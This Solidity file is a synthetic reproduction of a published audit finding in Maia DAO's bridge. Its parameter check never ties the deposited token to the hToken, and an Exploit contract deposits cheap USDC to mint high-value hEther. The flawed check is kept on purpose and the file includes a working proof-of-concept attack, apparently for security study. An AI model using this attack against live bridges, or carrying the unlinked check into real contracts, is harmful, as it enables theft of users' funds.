// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Maia DAO — RootBridgeAgent CheckParamsLib#checkParams does not check
    that _dParams.token is underlying of _dParams.hToken
    (Code4rena 2023-05, [H-09], #26043)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: checkParams verifies hToken is a local token and token is an
    underlying, but never that getLocalTokenFromUnder[token] == hToken.
    Attacker deposits cheap USDC and mints expensive hEther 1:1.
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Global hToken minted on root (represents bridged local asset).
contract HToken is MockERC20 {
    constructor(string memory n, string memory s) MockERC20(n, s) {}
}

interface IPort {
    function isLocalToken(address _token, uint24 _fromChain) external view returns (bool);
    function isUnderlyingToken(address _underlyingToken, uint24 _fromChain) external view returns (bool);
    function getLocalTokenFromUnder(address _underlying, uint24 _fromChain) external view returns (address);
}

contract RootPort is IPort {
    // underlying => chain => local hToken
    mapping(address => mapping(uint24 => address)) public getLocalTokenFromUnder;
    mapping(address => mapping(uint24 => bool)) public localTokens;
    mapping(address => HToken) public globalHToken; // local hToken => global mintable

    function register(address underlying, address localH, HToken globalH, uint24 chain) external {
        getLocalTokenFromUnder[underlying][chain] = localH;
        localTokens[localH][chain] = true;
        globalHToken[localH] = globalH;
    }

    function isLocalToken(address _token, uint24 _fromChain) external view returns (bool) {
        return localTokens[_token][_fromChain];
    }

    function isUnderlyingToken(address _underlyingToken, uint24 _fromChain) external view returns (bool) {
        return getLocalTokenFromUnder[_underlyingToken][_fromChain] != address(0);
    }

    function bridgeToRoot(address recipient, address hToken, uint256 deposit, uint24 /*fromChain*/) external {
        if (deposit > 0) {
            // mint(_recipient, _hToken, _deposit, _fromChainId)
            globalHToken[hToken].mint(recipient, deposit);
        }
    }
}

library CheckParamsLib {
    struct DepositParams {
        address hToken;
        address token;
        uint256 amount;
        uint256 deposit;
    }

    /// @dev VERBATIM checkParams from the finding — missing hToken↔underlying link.
    function checkParams(address _localPortAddress, DepositParams memory _dParams, uint24 _fromChain)
        internal
        view
        returns (bool)
    {
        if (
            (_dParams.amount < _dParams.deposit) //Deposit can't be greater than amount.
                || (_dParams.amount > 0 && !IPort(_localPortAddress).isLocalToken(_dParams.hToken, _fromChain)) //Check local exists.
                || (_dParams.deposit > 0 && !IPort(_localPortAddress).isUnderlyingToken(_dParams.token, _fromChain)) //Check underlying exists.
        ) {
            return false;
        }
        return true;
        // FIX: also require
        // IPort(_localPortAddress).getLocalTokenFromUnder(_dParams.token, _fromChain) == _dParams.hToken
    }
}

contract RootBridgeAgent {
    RootPort public immutable port;
    uint24 public constant FROM_CHAIN = 1; // Ethereum branch

    constructor(RootPort _port) {
        port = _port;
    }

    function bridgeIn(address recipient, CheckParamsLib.DepositParams memory dParams) external returns (bool) {
        // Inlined CheckParamsLib.checkParams (internal library → using contract)
        if (
            (dParams.amount < dParams.deposit)
                || (dParams.amount > 0 && !port.isLocalToken(dParams.hToken, FROM_CHAIN))
                || (dParams.deposit > 0 && !port.isUnderlyingToken(dParams.token, FROM_CHAIN)) // @> VULN: checks underlying exists but NOT that getLocalTokenFromUnder[token]==hToken
        ) {
            // FIX: || (port.getLocalTokenFromUnder(dParams.token, FROM_CHAIN) != dParams.hToken)
            return false;
        }
        port.bridgeToRoot(recipient, dParams.hToken, dParams.deposit, FROM_CHAIN);
        return true;
    }
}

contract BranchPort {
    function bridgeOut(MockERC20 token, address from, uint256 amount) external {
        token.transferFrom(from, address(this), amount);
    }
}

contract BranchBridgeAgent {
    BranchPort public immutable branchPort;
    RootBridgeAgent public immutable root;

    constructor(BranchPort _bp, RootBridgeAgent _root) {
        branchPort = _bp;
        root = _root;
    }

    function callOutAndBridge(CheckParamsLib.DepositParams memory dParams, address recipient) external {
        if (dParams.deposit > 0) {
            branchPort.bridgeOut(MockERC20(dParams.token), msg.sender, dParams.deposit);
        }
        // anyCall → RootBridgeAgent.bridgeIn
        root.bridgeIn(recipient, dParams);
    }
}

/// @notice Deposit 10 USDC, mint 10 hEther (worth 18000 USDC in the report's pricing).
contract Exploit {
    uint256 public constant DEPOSIT = 10 ether; // 10 USDC (18 dec for simplicity)

    MockERC20 public usdc;
    MockERC20 public weth;
    HToken public hUSDC;
    HToken public hEther;
    HToken public globalHEther;
    HToken public globalHUSDC;
    RootPort public port;
    RootBridgeAgent public root;
    BranchPort public branchPort;
    BranchBridgeAgent public branch;

    uint256 public attackerHEther;
    uint256 public usdcSpent;

    constructor() {
        usdc = new MockERC20("USD Coin", "USDC"); // CREATE 1
        weth = new MockERC20("Wrapped Ether", "WETH"); // CREATE 2
        hUSDC = new HToken("Local hUSDC", "hUSDC"); // CREATE 3
        hEther = new HToken("Local hEther", "hETH"); // CREATE 4
        globalHEther = new HToken("Global hEther", "ghETH"); // CREATE 5
        globalHUSDC = new HToken("Global hUSDC", "ghUSDC"); // CREATE 6
        port = new RootPort(); // CREATE 7
        root = new RootBridgeAgent(port); // CREATE 8 — vulnerable checkParams user
        branchPort = new BranchPort(); // CREATE 9
        branch = new BranchBridgeAgent(branchPort, root); // CREATE 10

        uint24 chain = 1;
        port.register(address(usdc), address(hUSDC), globalHUSDC, chain);
        port.register(address(weth), address(hEther), globalHEther, chain);

        usdc.mint(address(this), DEPOSIT);
    }

    function run() external {
        // Malicious DepositInput: hToken = hEther (high value), token = USDC (low value)
        // amount >= deposit (checkParams rejects amount < deposit). Pure underlying
        // deposit of 10 with mismatched hToken=hEther (should be hUSDC).
        CheckParamsLib.DepositParams memory dParams = CheckParamsLib.DepositParams({
            hToken: address(hEther),
            token: address(usdc),
            amount: DEPOSIT,
            deposit: DEPOSIT
        });

        usdc.approve(address(branchPort), DEPOSIT);
        branch.callOutAndBridge(dParams, address(this));

        attackerHEther = globalHEther.balanceOf(address(this));
        usdcSpent = DEPOSIT - usdc.balanceOf(address(this));

        // HARM: 10 USDC deposited → 10 global hEther minted (mismatched pair)
        require(usdcSpent == DEPOSIT, "spent 10 USDC");
        require(attackerHEther == DEPOSIT, "minted 10 hEther for 10 USDC");
        require(globalHUSDC.balanceOf(address(this)) == 0, "must not mint hUSDC");
        // Correct pairing would mint hUSDC; attacker received the high-value hEther instead.
    }
}
